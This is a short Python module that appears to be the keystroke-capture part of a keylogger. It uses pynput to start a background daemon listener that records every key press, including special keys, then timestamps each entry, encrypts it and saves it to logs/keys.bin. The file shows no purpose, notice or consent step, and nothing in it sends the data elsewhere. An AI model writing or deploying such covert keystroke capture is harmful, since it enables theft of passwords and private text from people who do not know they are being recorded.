from pynput import keyboard
import logger

def start_keystroke_monitor(cipher):
    """
    Starts a background listener for keyboard events.
    Each key press is timestamped, encrypted, and saved to logs/keys.bin.
    """

    def on_press(key):
        try:
            # Regular character keys
            char_bytes = str(key.char).encode()
        except AttributeError:
            # Special keys (Enter, Shift, etc.)
            char_bytes = f"[{key.name}]".encode()

        entry = logger.timestamped_bytes("KEY", char_bytes)
        logger.encrypt_and_write(entry, "keys.bin", cipher)

    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True   # so it stops when main program exits
    listener.start()
    return listener
